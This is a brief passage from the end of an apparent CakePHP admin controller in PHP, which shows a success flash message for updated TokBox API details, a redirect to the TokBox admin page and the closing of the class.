            $this->Flash->success('Toxbox Api Details Updated Successfully', ['key' => 'edit']);
            return $this->redirect('/admins/tokbox');
        }
    }


   
}
?>
